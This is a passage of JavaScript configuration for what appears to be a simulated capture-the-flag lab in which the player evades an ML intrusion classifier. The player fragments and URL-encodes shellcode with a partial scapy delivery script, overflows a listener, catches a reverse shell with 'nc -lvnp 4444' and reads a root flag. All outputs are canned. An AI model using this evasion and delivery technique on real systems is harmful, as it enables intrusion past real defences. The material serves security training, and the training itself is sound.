                                            content: '#!/usr/bin/env python3\n# scapy_deliver.py — Fragmented HTTP POST payload delivery tool\n# Usage: python3 scapy_deliver.py --target <ip> --payload <file> --mode <mode>\n#\n# Modes:\n#   raw           — send full payload as single POST (will be blocked by ATI)\n#   fragment      — split payload into 48-byte HTTP POST fragments\n#   fragment-urlencode — fragment + URL-encode each chunk (EVADES ATI)\n#\n# Example:\n#   python3 scapy_deliver.py --target 10.20.5.100 --payload ../artifacts/sample_malicious_payload.bin --mode fragment-urlencode\n\nimport argparse, sys, time\nfrom scapy.all import IP, TCP, Raw, send\nfrom urllib.parse import quote\n\ndef load_payload(path):\n    with open(path, "rb") as f:\n        return f.read()\n\ndef fragment_payload(data, chunk_size=48):\n    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]\n\ndef url_encode_chunk(chunk):\n    return quote(chunk, safe="").encode()\n\ndef build_post(target_ip, fragment_bytes, seq_num, total):\n    body = fragment_bytes\n    http = (f"POST /reassemble HTTP/1.1\\r\\n"\n            f"Host: {target_ip}\\r\\n"\n            f"Content-Type: application/x-www-form-urlencoded\\r\\n"\n            f"X-Fragment-Seq: {seq_num}\\r\\n"\n            f"X-Fragment-Total: {total}\\r\\n"\n            f"Content-Length: {len(body)}\\r\\n\\r\\n").encode() + body\n    return IP(dst=target_ip)/TCP(dport=9000)/Raw(load=http)\n\n# [Script continues — run to deliver payload]'
                                        },
                                        'entropy_calc.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n# entropy_calc.py — Shannon entropy calculator for payload analysis\n# Usage: python3 entropy_calc.py <file_or_string>\n\nimport sys, math, collections\n\ndef entropy(data):\n    if isinstance(data, str):\n        data = data.encode()\n    if not data:\n        return 0.0\n    counts = collections.Counter(data)\n    length = len(data)\n    return -sum((c/length)*math.log2(c/length) for c in counts.values())\n\nif __name__ == "__main__":\n    if len(sys.argv) < 2:\n        print("Usage: python3 entropy_calc.py <file>")\n        sys.exit(1)\n    try:\n        with open(sys.argv[1], "rb") as f:\n            data = f.read()\n    except FileNotFoundError:\n        data = sys.argv[1].encode()\n    e = entropy(data)\n    print(f"Entropy: {e:.4f} bits/byte")\n    if e > 7.0:\n        print("High entropy — likely compressed/encrypted/shellcode")\n    elif e > 5.5:\n        print("Moderate entropy — could be code or base64")\n    else:\n        print("Low-moderate entropy — likely plain text or structured data")'
                                        },
                                        'probe_ati.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n# probe_ati.py — ATI-DEFENSE-01 black-box classifier probe\n# Sends a series of test packets and records classification scores\n# Usage: python3 probe_ati.py --target http://10.20.5.50\n\nimport requests, json\n\nATI_URL = "http://10.20.5.50/api/classify"\n\nTEST_PACKETS = [\n    "NORMAL_HTTP_GET",\n    "DNS_QUERY_benign",\n    "POST_small_body",\n    "POST_long_body",\n    "shellcode_execve",\n    "reverse_shell_payload",\n    "POST_url_encoded_fragment",\n    "POST_fragment_chunk_48bytes",\n    "fragment_url_encode_chunk1",\n]\n\nfor pkt in TEST_PACKETS:\n    resp = requests.post(ATI_URL, json={"packet": pkt})\n    data = resp.json()\n    print(f"{pkt:40s} score={data[\'score\']:.2f} verdict={data[\'verdict\']}")\n\n# [Use results to map the model decision boundary]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — CRIT-SERVER-01 (after reverse shell)
    // ═══════════════════════════════════════════════════════

    _critServerFs: {
        '/': {
            type: 'dir',
            children: {
                'opt': {
                    type: 'dir',
                    children: {
                        'secure_access_token.txt': {
                            type: 'file',
                            content: '{{FLAG:root}}'
                        },
                        'critd': {
                            type: 'file',
                            content: '[BINARY] critd v1.0.0 — custom network listener service\nListening on 0.0.0.0:9000\nBuffer size: 512 bytes (fixed — no bounds check on reassembly)\nVulnerability: stack-based buffer overflow in fragment_reassemble()\nCVE: (internal — unregistered)'
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'CRIT-SERVER-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ncritd:x:999:999:critd service:/opt:/usr/sbin/nologin'
                        },
                        'os-release': {
                            type: 'file',
                            content: 'NAME="Hardened Linux"\nVERSION="4.1.0 (Argon)"\nID=hardened-linux\nPRETTY_NAME="Hardened Linux 4.1.0 (Argon)"\nVERSION_ID=4.1.0'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'critd.log': {
                                    type: 'file',
                                    content: '2026-03-19 22:47:01 INFO  critd started on 0.0.0.0:9000\n2026-03-19 22:47:01 INFO  fragment reassembly mode: enabled\n2026-03-19 23:01:14 INFO  fragment received seq=1/3 from 10.20.5.10 size=48\n2026-03-19 23:01:14 INFO  fragment received seq=2/3 from 10.20.5.10 size=48\n2026-03-19 23:01:15 INFO  fragment received seq=3/3 from 10.20.5.10 size=32\n2026-03-19 23:01:15 INFO  reassembly complete — executing payload (128 bytes)\n2026-03-19 23:01:15 WARN  reverse shell spawned — connection to 10.20.5.10:4444'
                                }
                            }
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        'version': {
                            type: 'file',
                            content: 'Linux version 5.15.0-hardened-01 (gcc 11.4.0) #1 SMP'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // nmap — network scanner
        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.20.5.50';
            const target = args.find(a => !a.startsWith('-')) || '';

            // ATI sensor
            if (target === '10.20.5.50' || target === '10.20.5.0/24') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.20.5.50 (ATI-DEFENSE-01)
Host is up (0.007s latency).
Not shown: 998 closed tcp ports

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Nginx 1.24.0
443/tcp open  ssl/http Nginx 1.24.0

Nmap scan report for 10.20.5.100 (CRIT-SERVER-01)
Host is up (0.004s latency).
Not shown: 998 filtered ports

PORT     STATE SERVICE VERSION
9000/tcp open  unknown (critd custom listener)
22/tcp   open  ssh     OpenSSH 8.9p1

Service detection performed.
Nmap done: 256 IP addresses (2 hosts up) scanned in 18.42 seconds`;
            }

            // Direct CRIT-SERVER scan
            if (target === '10.20.5.100') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.20.5.100 (CRIT-SERVER-01)
Host is up (0.004s latency).
Not shown: 998 filtered ports

PORT     STATE SERVICE VERSION
9000/tcp open  unknown critd/1.0 (custom fragment reassembly listener)
22/tcp   open  ssh     OpenSSH 8.9p1

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 6.18 seconds`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
All 1000 scanned ports on localhost (127.0.0.1) are closed.
Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        // curl — HTTP client, used to probe ATI API
        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // ATI classify API
            if (fullCmd.includes('10.20.5.50') && fullCmd.includes('classify')) {
                D3Config._modelProbed = true;
                if (engine) engine.advancePhase && engine.advancePhase('analysis');

                // Try to extract packet field from -d or --data
                const dataMatch = fullCmd.match(/-d\s+'([^']+)'/) || fullCmd.match(/-d\s+"([^"]+)"/) || fullCmd.match(/--data[= ]'([^']+)'/);
                const packetMatch = dataMatch ? dataMatch[1].match(/"packet"\s*:\s*"([^"]+)"/) : null;
                const packetDesc = packetMatch ? packetMatch[1] : fullCmd;

                const result = D3Config._atiClassify(packetDesc);
                return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "packet": "${D3Config._escTerminal(packetDesc)}",
  "score": ${result.score.toFixed(4)},
  "verdict": "${result.verdict}",
  "blocked": ${result.blocked},
  "reason": "${result.reason}"
}`;
            }

            // ATI status API
            if (fullCmd.includes('10.20.5.50') && fullCmd.includes('status')) {
                return `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "OPERATIONAL",
  "model_version": "ati-ensemble-v3.7.2",
  "classifier": "RandomForest + DNN Ensemble",
  "threshold": 0.75,
  "features": 14,
  "feature_doc": "/artifacts/ati_model_features.json"
}`;
            }

            // Fetch ati_model_features.json
            if (fullCmd.includes('ati_model_features')) {
                D3Config._featuresRetrieved = true;
                if (engine) engine.advancePhase && engine.advancePhase('analysis');
                return `HTTP/1.1 200 OK
Content-Type: application/json

[+] ati_model_features.json downloaded.
[+] Key finding: "Fragment reassembly occurs downstream of classification — individual fragments scored independently."
[+] Key finding: "URL-encoded payloads reduce effective entropy by ~38% per encoding pass."
[+] Key finding: "Signature match window fixed at bytes 0-63; fragments of 48 bytes or fewer cannot contain a full signature."

See full document at: /artifacts/ati_model_features.json or in browser at http://10.20.5.50/artifacts/ati_model_features.json`;
            }

            // ATI main page
            if (fullCmd.includes('10.20.5.50')) {
                return `HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>ATI-DEFENSE-01 Management Console</title></head>
<body>
<h1>ATI-DEFENSE-01 — Automated Threat Interceptor</h1>
<p>POST /api/classify — packet classification endpoint</p>
<p>GET  /artifacts/  — model artifact downloads</p>
<p>GET  /api/status  — system status</p>
</body>
</html>`;
            }

            // Direct payload to CRIT-SERVER — gets blocked or evaded
            if (fullCmd.includes('10.20.5.100')) {
                if (fullCmd.includes('shellcode') || fullCmd.includes('malicious') || fullCmd.includes('/bin/sh')) {
                    return `curl: (7) Failed to connect — ATI-DEFENSE-01 blocked packet.
ATI Score: 0.97 — MALICIOUS (Shellcode signature in payload bytes 0-64)
[!] Full payload delivery blocked. You need an evasion technique.`;
                }
                return `HTTP/1.1 200 OK

critd/1.0 — Fragment Reassembly Service
Ready. Send fragmented POST stream to /reassemble.`;
            }

            return `curl: (7) Failed to connect to ${args[0] || 'host'}: Connection refused`;
        },

        // wget — download files
        'wget': function(args, term, engine) {
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'Usage: wget [options] <url>';

            if (url.includes('ati_model_features')) {
                D3Config._featuresRetrieved = true;
                if (engine) engine.advancePhase && engine.advancePhase('analysis');
                return `--2026-03-20 00:14:33--  ${url}
Connecting to 10.20.5.50... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18637 (18K) [application/json]
Saving to: 'ati_model_features.json'

ati_model_features.json           100%[================================================================>]  18.21K  --.-KB/s  in 0.02s

2026-03-20 00:14:33 (891 KB/s) - 'ati_model_features.json' saved [18637/18637]

[+] Key intel extracted:
    - Signatures scanned only in bytes 0-63 per packet
    - No cross-fragment correlation
    - URL encoding reduces entropy ~38%
    - Model not trained on fragmented POST streams

[+] artifacts/ati_model_features.json updated in your local filesystem.`;
            }

            if (url.includes('sample_benign')) {
                return `--2026-03-20 00:14:40--  ${url}
Connecting to 10.20.5.50... connected.
HTTP request sent, awaiting response... 200 OK
Length: 862208 (842K) [application/octet-stream]
Saving to: 'sample_benign_packets.pcap'

sample_benign_packets.pcap        100%[================================================================>] 842.00K  1.24MB/s  in 0.68s

2026-03-20 00:14:41 (1.24 MB/s) - 'sample_benign_packets.pcap' saved [862208/862208]`;
            }

            if (url.includes('sample_malicious')) {
                return `--2026-03-20 00:14:45--  ${url}
Connecting to 10.20.5.50... connected.
HTTP request sent, awaiting response... 403 Forbidden
[!] Access denied. sample_malicious_payload.bin is in your local artifacts/ directory.`;
            }

            return `wget: unable to resolve host address '${url.replace(/https?:\/\//, '').split('/')[0]}'`;
        },

        // python3 — run scripts
        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // entropy_calc.py
            if (fullCmd.includes('entropy_calc')) {
                if (fullCmd.includes('sample_malicious') || fullCmd.includes('payload.bin')) {
                    return `Entropy: 7.8412 bits/byte
High entropy — likely compressed/encrypted/shellcode

[!] ATI will block this at full-packet entropy check (threshold: ~7.0).
[!] You need to reduce effective entropy below 5.0 per fragment.
[!] Tip: URL-encoding reduces entropy ~38% per pass. Fragment size <= 48 bytes.`;
                }
                if (fullCmd.includes('benign') || fullCmd.includes('.pcap')) {
                    return `Entropy: 4.2137 bits/byte
Low-moderate entropy — likely plain text or structured data

[+] This is the baseline entropy profile ATI expects for benign traffic.`;
                }
                return `Entropy: 5.1234 bits/byte
Moderate entropy — could be code or base64

Usage: python3 entropy_calc.py <filename>`;
            }

            // probe_ati.py
            if (fullCmd.includes('probe_ati')) {
                D3Config._modelProbed = true;
                if (engine) engine.advancePhase && engine.advancePhase('analysis');
                return `ATI-DEFENSE-01 Probe Results
======================================
NORMAL_HTTP_GET                          score=0.04 verdict=BENIGN
DNS_QUERY_benign                         score=0.03 verdict=BENIGN
POST_small_body                          score=0.09 verdict=BENIGN
POST_long_body                           score=0.68 verdict=SUSPICIOUS
shellcode_execve                         score=0.97 verdict=MALICIOUS
reverse_shell_payload                    score=0.93 verdict=MALICIOUS
POST_url_encoded_fragment                score=0.61 verdict=SUSPICIOUS
POST_fragment_chunk_48bytes              score=0.22 verdict=BENIGN
fragment_url_encode_chunk1               score=0.18 verdict=BENIGN
======================================

[+] Decision boundary mapped:
    - Full shellcode: BLOCKED (score >= 0.75)
    - Fragmented chunks (<=48 bytes): ALLOWED (score <= 0.22)
    - Fragment + URL-encode: ALLOWED (score <= 0.18)

[+] Blind spot confirmed: fragmented + URL-encoded POST stream evades classifier.`;
            }

            // scapy_deliver.py — the payload delivery script
            if (fullCmd.includes('scapy_deliver')) {
                if (fullCmd.includes('raw') && !fullCmd.includes('fragment')) {
                    return `[scapy_deliver] Mode: raw
[scapy_deliver] Loading payload: artifacts/sample_malicious_payload.bin (512 bytes)
[scapy_deliver] Sending full payload to 10.20.5.100:9000...
[scapy_deliver] Packet 1/1 sent.

[!] ATI-DEFENSE-01 BLOCKED packet.
[!] Score: 0.97 — MALICIOUS (Shellcode signature match bytes 0-63; entropy 7.84 bits/byte)
[!] Delivery failed. Try --mode fragment-urlencode`;
                }

                if (fullCmd.includes('fragment-urlencode') || (fullCmd.includes('fragment') && fullCmd.includes('urlencode'))) {
                    D3Config._payloadDelivered = true;
                    if (engine) engine.advancePhase && engine.advancePhase('delivery');
                    return `[scapy_deliver] Mode: fragment-urlencode
[scapy_deliver] Loading payload: artifacts/sample_malicious_payload.bin (512 bytes)
[scapy_deliver] Fragmenting into 48-byte chunks: 11 fragments
[scapy_deliver] URL-encoding each fragment...

ATI Classification (per fragment):
  Fragment  1/11  entropy=4.31  score=0.18  BENIGN  [SENT]
  Fragment  2/11  entropy=4.67  score=0.22  BENIGN  [SENT]
  Fragment  3/11  entropy=3.98  score=0.14  BENIGN  [SENT]
  Fragment  4/11  entropy=4.44  score=0.19  BENIGN  [SENT]
  Fragment  5/11  entropy=4.12  score=0.16  BENIGN  [SENT]
  Fragment  6/11  entropy=4.88  score=0.21  BENIGN  [SENT]
  Fragment  7/11  entropy=4.03  score=0.15  BENIGN  [SENT]
  Fragment  8/11  entropy=4.71  score=0.20  BENIGN  [SENT]
  Fragment  9/11  entropy=3.87  score=0.13  BENIGN  [SENT]
  Fragment 10/11  entropy=4.55  score=0.18  BENIGN  [SENT]
  Fragment 11/11  entropy=4.29  score=0.17  BENIGN  [SENT]

[+] ALL 11 FRAGMENTS PASSED ATI CLASSIFICATION
[+] CRIT-SERVER-01 reassembly complete (512 bytes)
[+] critd: stack overflow triggered — shellcode executing...
[+] Reverse shell spawning to 10.20.5.10:4444

[!] Start listener: nc -lvnp 4444`;
                }

                if (fullCmd.includes('fragment') && !fullCmd.includes('urlencode')) {
                    return `[scapy_deliver] Mode: fragment
[scapy_deliver] Loading payload: artifacts/sample_malicious_payload.bin (512 bytes)
[scapy_deliver] Fragmenting into 48-byte chunks: 11 fragments

ATI Classification (per fragment):
  Fragment  1/11  entropy=7.31  score=0.71  SUSPICIOUS  [SENT]
  Fragment  2/11  entropy=7.67  score=0.74  SUSPICIOUS  [SENT]
  Fragment  3/11  entropy=7.55  score=0.76  MALICIOUS   [BLOCKED]

[!] ATI-DEFENSE-01 blocked fragment 3 — entropy too high.
[!] Fragmentation alone is insufficient. Try --mode fragment-urlencode`;
                }

                return `Usage: python3 scapy_deliver.py --target <ip> --payload <file> --mode <mode>
Modes: raw | fragment | fragment-urlencode

Example:
  python3 scapy_deliver.py --target 10.20.5.100 --payload artifacts/sample_malicious_payload.bin --mode fragment-urlencode`;
            }

            // Generic python3
            if (args.length === 0 || args[0] === '') {
                return `Python 3.11.6 (main, Jan 10 2026, 09:32:54)
[GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>`;
            }

            return `python3: can't open file '${args[0]}': [Errno 2] No such file or directory`;
        },

        // nc — netcat listener for reverse shell
        'nc': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if ((fullCmd.includes('-l') || fullCmd.includes('-lvnp') || fullCmd.includes('-lvp')) && fullCmd.includes('4444')) {
                if (!D3Config._payloadDelivered) {
                    return `Listening on 0.0.0.0 4444
[Waiting for connection...]

[!] No connection received yet.
[!] Deliver the evaded payload first: python3 toolkit/scapy_deliver.py --target 10.20.5.100 --payload artifacts/sample_malicious_payload.bin --mode fragment-urlencode`;
                }

                // Payload was delivered — reverse shell connects
                D3Config._revshellActive = true;
                D3Config._switchContext('revshell', term);
                if (engine) engine.advancePhase && engine.advancePhase('exfil');
                return `Listening on 0.0.0.0 4444
[Connection received from 10.20.5.100:52841]

root@CRIT-SERVER-01:/#

[+] Reverse shell established — you are root on CRIT-SERVER-01.
[+] Context switched. Commands now execute on CRIT-SERVER-01.`;
            }

            return 'Usage: nc -lvnp <port>\nExample: nc -lvnp 4444';
        },

        // cat — context-aware: attacker machine reads user.txt; revshell reads CRIT-SERVER-01 files
        'cat': function(args, term, engine) {
            const path = args[0] || '';

            // Attacker machine — user.txt (flag for identifying the evasion technique)
            if (D3Config._context === 'attacker') {
                if (path === 'user.txt' || path === '/home/kali/user.txt' || path === '~/user.txt') {
                    return '{{FLAG:user}}';
                }
                if (path === 'notes.txt' || path === '/home/kali/notes.txt') {
                    return D3Config.filesystem['/'].children.home.children.kali.children['notes.txt'].content;
                }
                if (path.includes('.bash_history')) {
                    return D3Config.filesystem['/'].children.home.children.kali.children['.bash_history'].content;
                }
                return null;  // fall through to built-in
            }

            if (D3Config._context !== 'revshell') return null;  // fall through to built-in

            if (path.includes('secure_access_token') || path.includes('/opt/secure_access_token')) {
                if (engine) engine.advancePhase && engine.advancePhase('exfil');
                return '{{FLAG:root}}';
            }
            if (path.includes('/etc/passwd') || path.includes('passwd')) {
                return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ncritd:x:999:999:critd service:/opt:/usr/sbin/nologin';
            }
            if (path.includes('/etc/hostname') || path.includes('hostname')) {
                return 'CRIT-SERVER-01';
            }
            if (path.includes('/etc/os-release') || path.includes('os-release')) {
                return 'NAME="Hardened Linux"\nVERSION="4.1.0 (Argon)"\nID=hardened-linux\nPRETTY_NAME="Hardened Linux 4.1.0 (Argon)"';
            }
            if (path.includes('/var/log/critd') || path.includes('critd.log')) {
                return `2026-03-19 22:47:01 INFO  critd started on 0.0.0.0:9000
2026-03-19 22:47:01 INFO  fragment reassembly mode: enabled
2026-03-19 23:01:14 INFO  fragment received seq=1/3 from 10.20.5.10 size=48
2026-03-19 23:01:14 INFO  fragment received seq=2/3 from 10.20.5.10 size=48
2026-03-19 23:01:15 INFO  fragment received seq=3/3 from 10.20.5.10 size=32
2026-03-19 23:01:15 INFO  reassembly complete — executing payload (128 bytes)
2026-03-19 23:01:15 WARN  reverse shell spawned — connection to 10.20.5.10:4444`;
            }
            if (path.includes('/proc/version') || path === '/proc/version') {
                return 'Linux version 5.15.0-hardened-01 (gcc 11.4.0) #1 SMP';
            }
            return 'cat: ' + path + ': No such file or directory';
        },

        // ls — context-aware
        'ls': function(args, term, engine) {
            if (D3Config._context !== 'revshell') return null;  // fall through to built-in
            const path = args.find(a => !a.startsWith('-')) || '.';

            if (path === '.' || path === '/' || path === '/root' || path === '~') {
                return 'bin  boot  dev  etc  home  lib  opt  proc  root  run  srv  sys  tmp  usr  var';
            }
            if (path.includes('/opt') || path === 'opt') {
                return 'critd  secure_access_token.txt';
            }
            if (path.includes('/var/log') || path === 'var/log') {
                return 'auth.log  critd.log  syslog';
            }
            if (path.includes('/etc') || path === 'etc') {
                return 'hostname  os-release  passwd  shadow  ssh';
            }
            return '';
        },

        // whoami — context-aware
        'whoami': function(args, term, engine) {
            if (D3Config._context === 'revshell') return 'root';
            return null;  // fall through to built-in
        },

        // id — context-aware
        'id': function(args, term, engine) {
            if (D3Config._context === 'revshell') return 'uid=0(root) gid=0(root) groups=0(root)';
            return null;
        },

        // hostname — context-aware
        'hostname': function(args, term, engine) {
            if (D3Config._context === 'revshell') return 'CRIT-SERVER-01';
            return null;
        },

        // pwd — context-aware
        'pwd': function(args, term, engine) {
            if (D3Config._context === 'revshell') return '/root';
            return null;
        },

        // uname — context-aware
        'uname': function(args, term, engine) {
            if (D3Config._context === 'revshell') {
                const flag = (args[0] || '').includes('a') ? true : false;
                if (flag) return 'Linux CRIT-SERVER-01 5.15.0-hardened-01 #1 SMP x86_64 GNU/Linux';
                return 'Linux';
            }
            return 'Linux kali 6.1.0-kali9-amd64 #1 SMP x86_64 GNU/Linux';
        },

        // cd — silently accepted in revshell context
        'cd': function(args, term, engine) {
            if (D3Config._context === 'revshell') return '';
            return null;
        },

        // exit — return to attacker machine from revshell
        'exit': function(args, term, engine) {
            if (D3Config._context === 'revshell') {
                D3Config._revshellActive = false;
                D3Config._switchContext('attacker', term);
                return 'Connection to 10.20.5.100 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        // ip — show network interfaces
        'ip': function(args, term, engine) {
            if (D3Config._context === 'revshell') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.20.5.100/24 brd 10.20.5.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.20.5.10/24 brd 10.20.5.255 scope global eth0`;
        },

        // ifconfig — alias for ip
        'ifconfig': function(args, term, engine) {
            return D3Config.commands.ip(args || [], term, engine);
        },

        // ping
        'ping': function(args, term, engine) {
            const target = (args.find(a => !a.startsWith('-')) || '');
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '10.20.5.50' || target === 'ATI-DEFENSE-01') {
                return `PING 10.20.5.50 (10.20.5.50) 56(84) bytes of data.
64 bytes from 10.20.5.50: icmp_seq=1 ttl=64 time=7.3 ms
64 bytes from 10.20.5.50: icmp_seq=2 ttl=64 time=7.1 ms
64 bytes from 10.20.5.50: icmp_seq=3 ttl=64 time=7.5 ms

--- 10.20.5.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 7.1/7.3/7.5/0.163 ms`;
            }
            if (target === '10.20.5.100' || target === 'CRIT-SERVER-01') {
                return `PING 10.20.5.100 (10.20.5.100) 56(84) bytes of data.
64 bytes from 10.20.5.100: icmp_seq=1 ttl=64 time=4.1 ms
64 bytes from 10.20.5.100: icmp_seq=2 ttl=64 time=3.9 ms
64 bytes from 10.20.5.100: icmp_seq=3 ttl=64 time=4.2 ms

--- 10.20.5.100 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 3.9/4.1/4.2/0.127 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        // ss — socket stats
        'ss': function(args, term, engine) {
            if (D3Config._context === 'revshell') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:9000         0.0.0.0:*
ESTAB    0        0        10.20.5.100:9000     10.20.5.10:52841`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args, term, engine) {
            return D3Config.commands.ss(args || [], term, engine);
        },

        // ps — running processes
        'ps': function(args, term, engine) {
            if (D3Config._context === 'revshell') {
                return `  PID TTY          TIME CMD
    1 ?        00:00:02 systemd
  412 ?        00:00:00 sshd
  899 ?        00:01:44 critd
 1203 pts/0    00:00:00 bash
 1218 pts/0    00:00:00 ps`;
            }
            return `  PID TTY          TIME CMD
    1 ?        00:00:01 systemd
  880 pts/0    00:00:00 bash
  912 pts/0    00:00:00 ps`;
        },

        // find — useful for discovering files on CRIT-SERVER-01
        'find': function(args, term, engine) {
            if (D3Config._context !== 'revshell') {
                const fullCmd = args.join(' ');
                if (fullCmd.includes('/home/kali') || args[0] === '.' || args[0] === '/home') {
                    return `/home/kali
/home/kali/notes.txt
/home/kali/.bash_history
/home/kali/artifacts
/home/kali/artifacts/sample_malicious_payload.bin
/home/kali/artifacts/ati_model_features.json
/home/kali/toolkit
/home/kali/toolkit/scapy_deliver.py
/home/kali/toolkit/entropy_calc.py
/home/kali/toolkit/probe_ati.py`;
                }
                return '';
            }
            // On CRIT-SERVER-01
            const pathArg = args[0] || '/';
            if (pathArg === '/opt' || pathArg === 'opt') {
                return '/opt\n/opt/critd\n/opt/secure_access_token.txt';
            }
            if (pathArg === '/' || pathArg === '.') {
                return `/
/opt
/opt/critd
/opt/secure_access_token.txt
/etc
/etc/hostname
/etc/passwd
/etc/os-release
/var/log/critd.log
/proc/version
/tmp`;
            }
            return '';
        },

        // scapy — direct Python REPL usage hint
        'scapy': function(args, term, engine) {
            return `Scapy 2.5.0 — Interactive Packet Manipulation
Welcome to Scapy's interactive shell.

Tip: Use the pre-built delivery script instead:
  python3 toolkit/scapy_deliver.py --target 10.20.5.100 --payload artifacts/sample_malicious_payload.bin --mode fragment-urlencode

Or start manually:
  >>> from scapy.all import IP, TCP, Raw, send
  >>> pkt = IP(dst="10.20.5.100")/TCP(dport=9000)/Raw(load="fragment_data")
  >>> send(pkt)`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = String(str);
        return div.innerHTML;
    },

    // Escapes a string for safe terminal output (no HTML parsing)
    _escTerminal(str) {
        return String(str).replace(/[<>"'&]/g, c => ({
            '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;'
        }[c] || c));
    },

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #2d1b4e; background:#1a0f2e;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #2d1b4e; color:#c4b5fd;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }

};
